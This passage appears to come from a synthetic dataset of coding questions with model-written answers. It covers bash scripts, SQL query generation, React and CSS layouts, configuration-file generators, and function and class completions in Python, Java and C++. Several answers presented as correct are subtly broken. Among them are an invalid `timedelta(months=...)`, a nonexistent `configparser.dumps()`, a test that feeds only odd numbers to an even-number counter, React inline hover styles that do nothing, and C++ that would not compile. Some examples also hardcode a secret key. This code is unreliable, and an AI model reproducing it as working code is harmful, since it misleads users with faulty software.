(in months)')\nax.set_ylabel('Product Category')\nax.set_zlabel('Region')\n\n# Add color bar\ncbar = fig.colorbar(scatter, ax=ax, shrink=0.8)\ncbar.set_label('Sales Data')\n\n# Title\nax.set_title('Sales Distribution by Time, Product, and Region')\n\n# Show plot\nplt.show()\n```\n\nNote: The problem concepts are not directly mentioned in the given JSON, but they can be mapped to domains such as Data Science and Web Development where data visualization is a common task."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Generating bash commands", "Complexity_Level": "medium", "Response": "Question 1: Generate a Bash script that takes a filename as input and prints the last 10 lines of the file.\n```bash\n# Problem concept: Bash Scripting, Text to Code\n\nread -p \"Enter the filename: \" filename\n\nif [ -f \"$filename\" ]; then\n    tail -n 10 \"$filename\"\nelse\n    echo \"File does not exist.\"\nfi\n```\nExplanation: This Bash script prompts the user to enter a filename. It then checks if the file exists and, if it does, uses the `tail` command with the `-n` option to print the last 10 lines of the file. If the file does not exist, it displays an error message.\n\nQuestion 2: Create a Bash script that finds all `.txt` files in the current directory and its subdirectories, and then compresses them using `gzip`.\n```bash\n# Problem concept: Bash Scripting, Text to Code\n\nfind . -name \"*.txt\" -type f -exec gzip {} \\;\n```\nExplanation: This Bash script uses the `find` command to search for all files with a `.txt` extension in the current directory and its subdirectories. The `-name` flag specifies the filename pattern, `-type f` ensures only files (not directories) are selected, and the `-exec` flag runs the `gzip` command on each file found. The `{} \\;` notation at the end of `-exec` is used to pass each file to `gzip`. This will compress all `.txt` files, creating `.txt.gz` files."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Generating bash commands", "Complexity_Level": "extremely difficult", "Response": "Question 1: Generate a complex bash script that monitors system resource usage (CPU, memory, disk, and network) for a specified duration, collects statistics, and generates a report in JSON format. The script should also dynamically detect and track multiple running processes based on user-defined keywords.\n\nConcept: \"Shell Scripting\"\n\n```bash\n#!/bin/bash\n\n# Variables\nduration=${1:-60}  # Default duration to 60 seconds if not provided\nkeywords=(\"${@:2}\")  # Remaining arguments as keywords to track processes\nreport_file=\"report.json\"\ncpu_usage=()\nmem_usage=()\ndisk_usage=()\nnet_usage=()\nprocesses=()\n\n# Function to fetch process information based on keywords\nfunction fetch_processes() {\n  processes=($(pgrep -f -i -x \"${keywords[@]}\"))\n}\n\n# Function to record system usage\nfunction record_usage() {\n  cpu_usage+=($(top -b -n1 | grep \"Cpu(s)\" | awk '{print $2 + $4}'))\n  mem_usage+=($(free | awk '/Mem/{printf(\"%.2f\"), $3/$2 * 100}'))\n  disk_usage+=($(df / | awk '{if(NR==2)print $5}' | sed 's/%//g'))\n  net_usage+=($(netstat -i | awk '/eth0/ {print $2}' | tail -n1))\n}\n\n# Main loop\nfetch_processes\necho '{\"timestamp\":'\"$(date +%s)\"',\"cpu\":[],\"memory\":[],\"disk\":[],\"network\":[],\"processes\":[' > \"$report_file\"\n\nwhile [ $duration -gt 0 ]; do\n  record_usage\n  for ((i=0; i<${#processes[@]}; i++)); do\n    echo -n '{\"process\":\"'${processes[$i]}'\", \"cpu\":'\"${cpu_usage[$i]}\"', \"memory\":'\"${mem_usage[$i]}\"', \"disk\":'\"${disk_usage[$i]}\"', \"network\":'\"${net_usage[$i]}\"'},' >> \"$report_file\"\n  done\n  sleep 1\n  duration=$((duration - 1))\ndone\n\n# Remove last comma and close JSON array and object\nsed -i '$ s/,$//g' \"$report_file\"\necho ']}' >> \"$report_file\"\n```\n\nQuestion 2: Create a bash script that analyzes a system's log files, identifies common patterns, and summarizes them into a structured JSON output. The script should be able to handle multiple log files with varying formats and support regex-based pattern matching.\n\nConcept: \"Text Processing\"\n\n```bash\n#!/bin/bash\n\n# Variables\nlog_files=(\"$@\")  # Command-line arguments as log files\npatterns=(\"error\" \"exception\" \"fatal\")  # Keywords to match\nsummary_file=\"summary.json\"\n\n# Function to extract data based on patterns\nfunction extract_data() {\n  local file=$1\n  local output=()\n  for pattern in \"${patterns[@]}\"; do\n    output+=($(grep -o -i -E \"$pattern\" \"$file\"))\n  done\n  echo \"${output[@]}\"\n}\n\n# Function to summarize log data\nfunction summarize_logs() {\n  echo '{\"files\":['\n  for file in \"${log_files[@]}\"; do\n    echo -n '{\"name\":\"'${file}'\", \"patterns\":{'\n    for pattern in \"${patterns[@]}\"; do\n      echo -n '\"'\"$pattern\"'\":['\n      data=$(extract_data \"$file\" | sort | uniq)\n      for item in \"${data[@]}\"; do\n        echo -n '{\"text\":\"'${item}'\", \"count\":'$(grep -c -i -E \"$item\" \"$file\")'},' >> \"$summary_file\"\n      done\n      echo -n '],'\n    done\n    sed -i -e '$ s/,$//g' \"$summary_file\"  # Remove last comma\n    echo '}},'\n  done\n  echo ']}'\n}\n\nsummarize_logs > \"$summary_file\"\n```\n\nNote: These scripts are examples and may require adjustments to work perfectly in a real-world scenario, as actual log file formats and system configurations can vary."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Database query generation", "Complexity_Level": "medium", "Response": "Area: \"Database Management\"\nSub Area: \"Database query generation\"\n\nQuestion 1:\nYou have been given a JSON object representing a customer database with their orders. Each customer can have multiple orders, and each order has details such as the product, quantity, and order date. Write a Python function that generates a SQL query to fetch the top 5 customers who have placed the most orders in the last 6 months.\n\nSolution:\n```python\nimport datetime\nimport json\n\ndef generate_sql_query(customers_data, recent_months=6):\n    # Load JSON data into a Python data structure\n    customers = json.loads(customers_data)\n\n    # Generate SQL query\n    current_date = datetime.datetime.now()\n    six_months_ago = current_date - datetime.timedelta(months=recent_months)\n    query = \"\"\"\n    SELECT customer_name, COUNT(*) as order_count\n    FROM (\n        SELECT customer_name, order_date\n        FROM orders\n        WHERE order_date >= '{}'\n    ) as recent_orders\n    GROUP BY customer_name\n    ORDER BY order_count DESC\n    LIMIT 5;\n    \"\"\".format(six_months_ago.strftime('%Y-%m-%d'))\n\n    return query\n\n# Example JSON data\njson_data = \"\"\"\n[\n  {\n    \"customer_id\": 1,\n    \"customer_name\": \"Alice\",\n    \"orders\": [\n      {\"product\": \"Product1\", \"quantity\": 2, \"order_date\": \"2023-02-15\"},\n      {\"product\": \"Product2\", \"quantity\": 1, \"order_date\": \"2023-04-20\"}\n    ]\n  },\n  {\n    \"customer_id\": 2,\n    \"customer_name\": \"Bob\",\n    \"orders\": [\n      {\"product\": \"Product3\", \"quantity\": 3, \"order_date\": \"2023-01-10\"},\n      {\"product\": \"Product4\", \"quantity\": 1, \"order_date\": \"2023-06-01\"},\n      {\"product\": \"Product5\", \"quantity\": 2, \"order_date\": \"2023-06-15\"}\n    ]\n  }\n]\n\"\"\"\n\n# Print the generated SQL query\nprint(generate_sql_query(json_data))\n```\nConcept: \"Database query generation\"\n\nQuestion 2:\nYou've been tasked with creating a Python script that converts a user's input, which is a list of ingredients, into an SQL query to search a recipe database for all recipes containing at least one of those ingredients. Develop a function that takes a list of ingredients and returns a properly formatted SQL `IN` clause.\n\nSolution:\n```python\ndef generate_in_clause(ingredients):\n    # Check if the list is empty\n    if not ingredients:\n        return \"''\"\n\n    # Generate the IN clause with quoted and comma-separated ingredients\n    quoted_ingredients = \", \".join([\"'{}'\".format(ingredient.replace(\"'\", \"''\")) for ingredient in ingredients])\n    return quoted_ingredients\n\n# Example list of ingredients\ningredients = [\"potatoes\", \"onions\", \"garlic\"]\n\n# Generate the IN clause\nin_clause = generate_in_clause(ingredients)\n\n# Print the IN clause to be used in an SQL query\nprint(\"SELECT * FROM recipes WHERE ingredients IN ({})\".format(in_clause))\n```\nConcept: \"Database query generation\""}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Database query generation", "Complexity_Level": "extremely difficult", "Response": "The concept of \"Code generation (e.g., Text to Code)\" is not explicitly mentioned in the provided JSON. However, we can create a problem related to \"Database Management\" and \"Database query generation\" which involves advanced SQL techniques.\n\nQuestion 1:\nDevelop a SQL query generator that receives natural language input describing a complex report with nested subtotals, conditional calculations, and grouping. For instance, given the following description:\n\n\"Generate a report of sales by product category, showing the total sales, average sales, and the highest and lowest sales per category. Additionally, display a subtotal for each region within each category, considering only sales above $5000.\"\n\nSolution:\nThe SQL query for this problem would be quite extensive and require the use of subqueries, window functions, and conditional statements. Here's an example in PostgreSQL:\n\n```sql\nWITH regional_sales AS (\n  SELECT\n    product_category,\n    region,\n    SUM(sales) AS total_sales,\n    sales\n  FROM sales_data\n  WHERE sales > 5000\n  GROUP BY product_category, region\n), category_totals AS (\n  SELECT\n    product_category,\n    SUM(total_sales) OVER (PARTITION BY product_category) AS category_total_sales,\n    AVG(total_sales) OVER (PARTITION BY product_category) AS category_avg_sales,\n    MIN(total_sales) OVER (PARTITION BY product_category) AS category_min_sales,\n    MAX(total_sales) OVER (PARTITION BY product_category) AS category_max_sales\n  FROM regional_sales\n), regional_subtotals AS (\n  SELECT\n    product_category,\n    region,\n    total_sales,\n    category_avg_sales,\n    category_min_sales,\n    category_max_sales,\n    ROW_NUMBER() OVER (PARTITION BY product_category ORDER BY total_sales DESC) AS rank\n  FROM category_totals\n)\nSELECT\n  rs.product_category,\n  rs.region,\n  rs.total_sales,\n  ct.category_avg_sales,\n  ct.category_min_sales,\n  ct.category_max_sales\nFROM regional_sales rs\nJOIN category_totals ct ON rs.product_category = ct.product_category\nJOIN regional_subtotals rss ON rs.product_category = rss.product_category AND rs.region = rss.region\nWHERE rss.rank = 1\nORDER BY rs.product_category, rs.region;\n```\nThis query calculates sales aggregates per category and region, then applies conditional calculations and subtotals for regions within each category.\n\nQuestion 2:\nCreate an AI model that translates a high-level description of database schema changes into migration scripts for multiple database systems (e.g., MySQL, PostgreSQL, and SQLite). For example, given:\n\n\"Add a new column 'is_active' to the 'users' table with a default value of 'true' and ensure compatibility with existing data.\"\n\nSolution:\nThis problem involves AI natural language processing (NLP) and understanding to generate code. While a full AI model isn't provided, here is an example of how the generated migration scripts might look for each DBMS:\n\nMySQL:\n```sql\nALTER TABLE users ADD COLUMN is_active BOOLEAN NOT NULL DEFAULT TRUE;\n```\nPostgreSQL:\n```sql\nALTER TABLE users ADD COLUMN is_active BOOLEAN NOT NULL DEFAULT TRUE;\n```\nSQLite:\n```sql\nALTER TABLE users ADD COLUMN is_active BOOLEAN DEFAULT 1;\n```\nTo develop an AI model for this task, you would need to train a language model (e.g., using GPT-3 or BERT) on a large dataset of database schema descriptions and corresponding migration scripts. The model would need to understand the syntax and semantics of different database systems to generate compatible code. This task would require extensive data preprocessing, training, and fine-tuning and goes beyond the scope of a simple SQL query."}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "UI code generation", "Complexity_Level": "medium", "Response": "\"Code generation (e.g., Text to Code)\" is not explicitly listed in the provided domain JSON, but we can assume a related concept from the \"Web Development\" domain, specifically \"Frontend Development\". Here, we'll generate medium complexity problems related to UI code generation, focusing on creating a responsive layout with CSS.\n\nQuestion 1:\nProblem: Given a textual description of a three-column layout with a header, main content, and footer, generate the corresponding HTML and CSS code for a responsive design using Flexbox.\n\nSolution:\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n        }\n        body {\n            font-family: Arial, sans-serif;\n        }\n        .container {\n            display: flex;\n            flex-wrap: wrap;\n            padding: 20px;\n        }\n        header, footer {\n            width: 100%;\n            background: #333;\n            color: #fff;\n            padding: 20px;\n            text-align: center;\n        }\n        .main {\n            flex: 1 1 calc(33.33% - 20px);\n            background: #f1f1f1;\n            padding: 20px;\n        }\n        @media (max-width: 768px) {\n            .main {\n                flex: 1 1 calc(100% - 20px);\n            }\n        }\n    </style>\n</head>\n<body>\n    <header>Header</header>\n    <div class=\"container\">\n        <div class=\"main\">Column 1</div>\n        <div class=\"main\">Column 2</div>\n        <div class=\"main\">Column 3</div>\n    </div>\n    <footer>Footer</footer>\n</body>\n</html>\n```\nConcept: Frontend Development - Responsive Layout with Flexbox\n\nQuestion 2:\nProblem: Given a brief description of a card component with a title, image, and description, generate the corresponding React component code with inline styles for a responsive display.\n\nSolution:\n```jsx\nimport React from 'react';\n\nconst Card = ({ title, image, description }) => {\n  return (\n    <div style={{\n      display: 'flex',\n      flexFlow: 'column nowrap',\n      borderRadius: '5px',\n      boxShadow: '0 2px 5px rgba(0, 0, 0, 0.16)',\n      padding: '20px',\n      margin: '10px',\n      overflow: 'hidden',\n      transition: '0.3s',\n      ':hover': {\n        transform: 'translateY(-2px)',\n        boxShadow: '0 5px 15px rgba(0, 0, 0, 0.3)',\n      },\n    }}>\n      <img src={image} alt={title} style={{ width: '100%', height: '200px', objectFit: 'cover' }} />\n      <h3 style={{ margin: '10px 0', color: '#333' }}>{title}</h3>\n      <p style={{ color: '#666', fontSize: '14px' }}>{description}</p>\n    </div>\n  );\n};\n\nexport default Card;\n```\nConcept: Web Development - Frontend Development with React"}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "UI code generation", "Complexity_Level": "extremely difficult", "Response": "Code generation, especially UI code generation, is not explicitly mentioned in the provided JSON. However, we can infer a related concept from the \"Web Development\" domain under the \"Development\" category. Specifically, we can consider the \"Frontend Development\" subtopic, which involves generating UI code using frontend frameworks.\n\nQuestion 1: Generate a highly dynamic, responsive, and accessible UI code for a complex e-commerce product detail page with the following features:\n\n1. Product images carousel with lazy loading and swipe gestures for touch devices.\n2. A detailed product description with rich text formatting and dynamic resizing based on screen size.\n3. A flexible and adaptive product options selection (e.g., size, color) using checkboxes, radio buttons, and dropdowns.\n4. A real-time inventory display and availability status updates.\n5. A customizable product rating and review system with social media sharing functionality.\n\nSolution:\nHere's an example of how you might approach this problem using React and TypeScript, leveraging libraries like `react-slick` for the carousel, `react-responsive` for responsive design, and `react-star-ratings` for the rating system:\n\n```typescript\nimport React, { useState, useEffect } from 'react';\nimport Slider from 'react-slick';\nimport { MediaType } from 'react-responsive';\nimport StarRatings from 'react-star-ratings';\n\nconst ProductDetailPage: React.FC<ProductDetailProps> = ({ product }) => {\n  const [inventory, setInventory] = useState(product.inventory);\n  const [reviewCount, setReviewCount] = useState(product.reviews.length);\n  const [rating, setRating] = useState(product.averageRating);\n\n  const productImages = product.images.map(img => img.src);\n\n  const carouselSettings = {\n    dots: true,\n    infinite: true,\n    speed: 500,\n    slidesToShow: 1,\n    slidesToScroll: 1,\n    responsive: [\n      // Configure responsive breakpoints here\n    ]\n  };\n\n  useEffect(() => {\n    // Fetch real-time inventory updates and update the state\n  }, []);\n\n  return (\n    <div className=\"product-detail-page\">\n      <MediaType minWidth={768}>\n        <Slider {...carouselSettings}>\n          {productImages.map((image, index) => (\n            <img key={index} src={image} alt={product.name} />\n          ))}\n        </Slider>\n      </MediaType>\n      <MediaType maxWidth={767}>\n        {productImages.map((image, index) => (\n          <img key={index} src={image} alt={product.name} style={{ width: '100%' }} />\n        ))}\n      </MediaType>\n      <div>{product.description}</div>\n      <ProductOptions options={product.options} />\n      <div>\n        <span>Inventory: {inventory} left</span>\n        <span>Availability: {inventory > 0 ? 'In stock' : 'Out of stock'}</span>\n      </div>\n      <div>\n        <StarRatings\n          rating={rating}\n          changeRating={setRating}\n          numberOfStars={5}\n          name=\"rating-stars\"\n        />\n        <span>({reviewCount} Reviews)</span>\n        <WriteReviewButton />\n      </div>\n      <SocialSharing shareUrl={product.shareUrl} />\n    </div>\n  );\n};\n\n// Define the ProductOptions, WriteReviewButton, and SocialSharing components here\n\nexport default ProductDetailPage;\n```\nNote: The above code is a high-level illustration and doesn't cover all the details of each component (e.g., `ProductOptions`, `WriteReviewButton`, and `SocialSharing`). Implementing these features would require additional code and potentially integrating with external libraries or APIs.\n\nQuestion 2: Develop a code generation tool that takes a JSON-based UI"}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Configuration file generation", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are developing a tool that generates configurations for a web application based on user input. The user specifies the database type, API endpoints, and security settings. Write a function that takes these inputs and generates a YAML configuration file.\n\nSolution:\n```python\nimport yaml\n\ndef generate_config_file(db_type, api_endpoints, security_settings):\n    config = {\n        \"database\": {\n            \"type\": db_type\n        },\n        \"api\": {\n            \"endpoints\": api_endpoints\n        },\n        \"security\": security_settings\n    }\n\n    with open(\"config.yaml\", \"w\") as config_file:\n        yaml.dump(config, config_file, default_flow_style=False)\n\n# Example usage\ndb_type = \"postgresql\"\napi_endpoints = [\"users\", \"products\", \"orders\"]\nsecurity_settings = {\n    \"auth\": \"JWT\",\n    \"secret_key\": \"mysecurekey\",\n    \"allowed_ips\": [\"192.168.1.0/24\", \"10.0.0.0/8\"]\n}\n\ngenerate_config_file(db_type, api_endpoints, security_settings)\n```\nConcept: Configuration File Generation (YAML)\n\nQuestion 2:\nProblem: You need to create a function that reads environment variables for a microservice application and generates a TOML configuration file suitable for use with the `dotenv` library in a Node.js project.\n\nSolution:\n```javascript\nconst fs = require('fs');\nconst { createWriteStream } = require('fs');\nconst { parse } = require('toml');\n\nfunction generateDotEnvConfigFile(envVariables) {\n    let dotenvContent = '';\n\n    for (let key in envVariables) {\n        dotenvContent += `${key}=${envVariables[key]}\\n`;\n    }\n\n    const writeStream = createWriteStream('.env', { flags: 'w' });\n    writeStream.write(dotenvContent);\n    writeStream.end();\n\n    console.log('Environment variables written to .env file.');\n}\n\n// Example usage\nconst envVariables = {\n    API_KEY: 'my_api_key123',\n    DATABASE_URL: 'mongodb://localhost:27017/mydb',\n    NODE_ENV: 'development'\n};\n\ngenerateDotEnvConfigFile(envVariables);\n```\nConcept: Configuration File Generation (TOML)"}, {"L2_TASK": "Code generation (e.g., Text to Code)", "L3_TASK": "Configuration file generation", "Complexity_Level": "extremely difficult", "Response": "Unfortunately, the provided JSON doesn't have a specific category for \"Code generation (e.g., Text to Code)\" or \"Configuration file generation\". However, we can create a problem involving code generation and configuration file management, drawing from the \"Programming Language Concepts\" and \"Development\" categories.\n\nProblem 1: Develop a system that automatically generates and validates complex configuration files for a distributed application based on a set of high-level user-defined rules. The system should support various configuration formats (e.g., YAML, JSON, INI) and ensure consistency across all instances in the distributed environment.\n\nConcept: Configuration File Generation, Text Parsing, Code Generation\n\nSolution:\n```python\nimport yaml\nimport json\nimport configparser\nfrom typing import Dict, Any\n\ndef generate_config(user_rules: Dict[str, Any], format: str) -> str:\n    if format == 'yaml':\n        return yaml.dump(user_rules, sort_keys=False)\n    elif format == 'json':\n        return json.dumps(user_rules, indent=2)\n    elif format == 'ini':\n        config = configparser.ConfigParser()\n        for section, options in user_rules.items():\n            config.add_section(section)\n            for option, value in options.items():\n                config.set(section, option, value)\n        return config.dumps()\n\ndef validate_config(config_content: str, expected_format: str, user_rules: Dict[str, Any]) -> bool:\n    if expected_format == 'yaml':\n        loaded_config = yaml.safe_load(config_content)\n    elif expected_format == 'json':\n        loaded_config = json.loads(config_content)\n    elif expected_format == 'ini':\n        config = configparser.ConfigParser()\n        config.read_string(config_content)\n        loaded_config = {section: dict(config.items(section)) for section in config.sections()}\n    else:\n        return False\n\n    return loaded_config == user_rules\n\n# Example usage\nuser_rules = {\n    'server': {\n        'host': 'localhost',\n        'port': 8080,\n        'max_connections': 1000\n    },\n    'logging': {\n        'level': 'info',\n        'file': '/var/log/app.log'\n    }\n}\ngenerated_config = generate_config(user_rules, 'yaml')\nprint(generated_config)\n\n# Validate generated YAML against the original rules\nis_valid = validate_config(generated_config, 'yaml', user_rules)\nprint(f'Config is valid: {is_valid}')\n```\nThis solution provides a Python script that takes user-defined rules as input and generates configuration files in YAML, JSON, or INI formats. It also includes a validation function to ensure the generated configuration matches the original rules. This example demonstrates text parsing, code generation, and configuration file management skills."}, {"L2_TASK": "Code completion", "L3_TASK": "Complete a function", "Complexity_Level": "medium", "Response": "Problem 1:\nConcept: Function completion in Python\n\nYou're given a partially implemented function `calculate_area` that should calculate the area of a rectangle given its length and width. The function is missing the actual calculation. Complete the function.\n\n```python\ndef calculate_area(length, width):\n    # TODO: Complete the function to calculate the area of the rectangle\n    pass\n\n# Example usage:\nrect_length = 10\nrect_width = 5\narea = calculate_area(rect_length, rect_width)\nprint(f\"The area of the rectangle is: {area}\")\n```\n\nSolution:\n```python\ndef calculate_area(length, width):\n    # Calculate the area of the rectangle\n    area = length * width\n    return area\n\n# Example usage:\nrect_length = 10\nrect_width = 5\narea = calculate_area(rect_length, rect_width)\nprint(f\"The area of the rectangle is: {area}\")\n```\n\nProblem 2:\nConcept: Function completion in JavaScript\n\nYou're working on a web application and need to create a utility function `convertTemperature` that converts temperatures between Celsius and Fahrenheit. The function is partially implemented and requires the conversion logic for both directions. Complete the function.\n\n```javascript\nfunction convertTemperature(temp, fromScale, toScale) {\n    if (fromScale === 'C' && toScale === 'F') {\n        // TODO: Convert Celsius to Fahrenheit\n    } else if (fromScale === 'F' && toScale === 'C') {\n        // TODO: Convert Fahrenheit to Celsius\n    } else {\n        throw new Error('Invalid temperature scale');\n    }\n    return temp;\n}\n\n// Example usages:\ncelsius = 25;\nconsole.log(convertTemperature(celsius, 'C', 'F')); // Expected output: 77\n\nfahrenheit = 77;\nconsole.log(convertTemperature(fahrenheit, 'F', 'C')); // Expected output: 25\n```\n\nSolution:\n```javascript\nfunction convertTemperature(temp, fromScale, toScale) {\n    if (fromScale === 'C' && toScale === 'F') {\n        // Convert Celsius to Fahrenheit\n        temp = (temp * 9) / 5 + 32;\n    } else if (fromScale === 'F' && toScale === 'C') {\n        // Convert Fahrenheit to Celsius\n        temp = (temp - 32) * 5 / 9;\n    } else {\n        throw new Error('Invalid temperature scale');\n    }\n    return temp;\n}\n\n// Example usages:\ncelsius = 25;\nconsole.log(convertTemperature(celsius, 'C', 'F')); // Expected output: 77\n\nfahrenheit = 77;\nconsole.log(convertTemperature(fahrenheit, 'F', 'C')); // Expected output: 25\n```"}, {"L2_TASK": "Code completion", "L3_TASK": "Complete a function", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a partially implemented function that takes a list of integers and returns a dictionary with the count of each unique even number in the list. However, the function is currently unable to handle large inputs efficiently. The task is to optimize the function to have a time complexity of O(n) and space complexity of O(e), where n is the number of elements in the input list and e is the count of even numbers.\n\nFunction to complete:\n```python\ndef count_even_numbers(numbers):\n    even_count = {}\n    for num in numbers:\n        if num % 2 == 0:  # Check if number is even\n            if num in even_count:\n                even_count[num] += 1\n            else:\n                even_count[num] = 1\n    return even_count\n```\n\nSolution:\nTo optimize the function, we can use a dictionary to store the count of even numbers and a set to keep track of unique even numbers, which will reduce the lookups to O(1). Here's the optimized function:\n\n```python\ndef count_even_numbers(numbers):\n    unique_evens = set()\n    counts = {}\n    \n    for num in numbers:\n        if num % 2 == 0:\n            unique_evens.add(num)\n            counts[num] = counts.get(num, 0) + 1\n    \n    return counts\n\n# Test the function with a large input\ninput_list = list(range(1, 1000001, 2))\nresult = count_even_numbers(input_list)\nprint(result)\n```\nConcept: Optimizing time and space complexity\n\nQuestion 2:\nYou are given an incomplete function that takes a list of dictionaries, where each dictionary represents a student with attributes `name`, `age`, and `grades`. The function should return the average grade of all students, but it currently fails to handle edge cases and outliers. Improve the function to handle exceptional cases, such as missing grades, non-numeric grades, and extremely high or low grades.\n\nFunction to complete:\n```python\ndef calculate_average_grade(students):\n    total_grades = 0\n    grade_count = 0\n    for student in students:\n        total_grades += student['grades']\n        grade_count += 1\n    return total_grades / grade_count\n```\n\nSolution:\nWe can iterate through each student, handle exceptions, and filter out invalid grades. Here's the improved function:\n\n```python\ndef calculate_average_grade(students):\n    total_valid_grades = 0\n    grade_count = 0\n    \n    for student in students:\n        grades = student.get('grades', [])\n        for grade in grades:\n            try:\n                numeric_grade = float(grade)\n                if 0 <= numeric_grade <= 100:\n                    total_valid_grades += numeric_grade\n                    grade_count += 1\n            except ValueError:\n                pass\n    \n    if grade_count == 0:\n        return None\n    else:\n        return total_valid_grades / grade_count\n\n# Test the function with edge cases\nstudents_data = [\n    {\"name\": \"Alice\", \"age\": 18, \"grades\": [85, 92, \"invalid\", 78]},\n    {\"name\": \"Bob\", \"age\": 19, \"grades\": [90, -10, 88]},\n    {\"name\": \"Charlie\", \"age\": 17, \"grades\": [95, 80, \"A\"]}\n]\n\nresult = calculate_average_grade(students_data)\nprint(result)\n```\nConcept: Error handling and data validation"}, {"L2_TASK": "Code completion", "L3_TASK": "Complete a class", "Complexity_Level": "medium", "Response": "Question 1:\nIn a Java project, you are asked to create a simple `Student` class with the following attributes: `name`, `age`, and `major`. The class should also have appropriate getters, setters, a constructor, and a `toString` method. You have partially completed the class, but need to finish it.\n\n```java\npublic class Student {\n    private String name;\n    private int age;\n    private String major;\n\n    // TODO: Complete the constructor, getters, setters, and toString method\n\n    // Constructor\n    public Student(String name, int age, String major) {\n        // Complete the constructor to initialize the attributes\n    }\n\n    // Getter for name\n    public String getName() {\n        // Complete the getter method for name\n    }\n\n    // Setter for name\n    public void setName(String name) {\n        // Complete the setter method for name\n    }\n\n    // Getter for age\n    public int getAge() {\n        // Complete the getter method for age\n    }\n\n    // Setter for age\n    public void setAge(int age) {\n        // Complete the setter method for age\n    }\n\n    // Getter for major\n    public String getMajor() {\n        // Complete the getter method for major\n    }\n\n    // Setter for major\n    public void setMajor(String major) {\n        // Complete the setter method for major\n    }\n\n    // toString method\n    public String toString() {\n        // Complete the toString method to represent the Student object in a readable format\n    }\n}\n```\n\nSolution:\n```java\npublic class Student {\n    private String name;\n    private int age;\n    private String major;\n\n    public Student(String name, int age, String major) {\n        this.name = name;\n        this.age = age;\n        this.major = major;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public String getMajor() {\n        return major;\n    }\n\n    public void setMajor(String major) {\n        this.major = major;\n    }\n\n    public String toString() {\n        return \"Student{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                \", major='\" + major + '\\'' +\n                '}';\n    }\n}\n```\n\nQuestion 2:\nYou're working on a Python project where you need to define a `Rectangle` class with `width`, `height`, and `color` attributes. The class should have methods to calculate the area and perimeter, as well as a method to change the color. You have started the class, but need to complete it.\n\n```python\nclass Rectangle:\n    def __init__(self, width, height, color):\n        self.width = width\n        self.height = height\n        # TODO: Complete the color attribute and related methods\n\n    # TODO: Implement the area calculation method\n    def area(self):\n        pass\n\n    # TODO: Implement the perimeter calculation method\n    def perimeter(self):\n        pass\n\n    # TODO: Implement a method to change the color\n    def change_color(self, new_color):\n        pass\n```\n\nSolution:\n```python\nclass Rectangle:\n    def __init__(self, width, height, color):\n        self.width = width\n        self.height = height\n        self.color = color\n\n    def area(self):\n        return self.width * self.height\n\n    def perimeter(self):\n        return 2 * (self.width + self.height)\n\n    def change_color(self, new_color):\n        self.color = new_color\n```\n\nConcept: Class"}, {"L2_TASK": "Code completion", "L3_TASK": "Complete a class", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nSuppose you're developing a complex game engine using C++, and you have an abstract base class `GameObject` that represents any object in the game world. The engine requires dynamic behavior based on the type of game object, such as enemy characters, collectibles, or environmental objects. You need to create a `Character` class, a `Collectible` class, and an `Environment` class, each inheriting from `GameObject`, but with additional functionality and complex interactions.\n\nProblem:\nDesign and implement the `GameObject`, `Character`, `Collectible`, and `Environment` classes with the following requirements:\n\n1. `GameObject` should have basic properties such as position, rotation, and scale.\n2. `Character` should have health points, attack damage, and a `fight()` method that takes another `Character` as an argument and adjusts their health points based on the attacker's damage.\n3. `Collectible` should have a `collect()` method that provides a reward when collected by a `Character`. The reward could be health points, score, or special abilities.\n4. `Environment` should have interactive objects like doors, switches, and triggers. Implement a `triggerEvent()` method that reacts to events like door opening or trigger activation.\n\nSolution:\n```cpp\n#include <iostream>\n#include <vector>\n#include <variant>\n\nclass GameObject {\npublic:\n    virtual ~GameObject() = default;\n    virtual void update() = 0;\n    virtual void draw() = 0;\n\n    struct Transform {\n        float position[3];\n        float rotation[3];\n        float scale[3];\n    };\n\n    Transform transform;\n};\n\nclass Character : public GameObject {\npublic:\n    Character(float initialHP) : healthPoints(initialHP) {}\n    virtual ~Character() = default;\n    void fight(Character& other, float attackDamage) {\n        other.healthPoints -= attackDamage;\n        if (other.healthPoints < 0) other.healthPoints = 0;\n    }\n\n    float healthPoints;\n    float attackDamage = 10.0f;\n};\n\nclass Collectible : public GameObject {\npublic:\n    Collectible(float reward) : reward(reward) {}\n    virtual ~Collectible() = default;\n    void collect(Character& character) {\n        character.healthPoints += reward;\n        if (character.healthPoints > 100) character.healthPoints = 100;\n    }\n\n    float reward;\n};\n\nclass Environment : public GameObject {\npublic:\n    using Event = std::variant<Collectible*, Character*>; // Can trigger events related to Collectible or Character\n    void triggerEvent(Event e) {\n        if (std::holds_alternative<Collectible*>(e)) {\n            Collectible* c = std::get<Collectible*>(e);\n            std::cout << \"Collected collectible, reward: \" << c->reward << std::endl;\n        } else if (std::holds_alternative<Character*>(e)) {\n            Character* c = std::get<Character*>(e);\n            std::cout << \"Interacted with character, health: \" << c->healthPoints << std::endl;\n        }\n    }\n};\n\nint main() {\n    Character player(100);\n    Character enemy(50);\n    Collectible healthBoost(20);\n    Environment gameWorld;\n\n    gameWorld.triggerEvent(healthBoost);\n    player.fight(enemy, player.attackDamage);\n    gameWorld.triggerEvent(player);\n\n    return 0;\n}\n```\n\nQuestion 2:\nYou're developing a complex financial system in Python using object-oriented principles. The system has a base class `Transaction` and two subclasses: `Deposit` and `Withdrawal`. Transactions need to be processed in the order they were made, while handling concurrent access and ensuring data integrity.\n\nProblem:\nDesign and implement the `Transaction`, `Deposit`, and `Withdrawal` classes with the following requirements:\n\n1. `Transaction` should have a timestamp, an amount, and a type 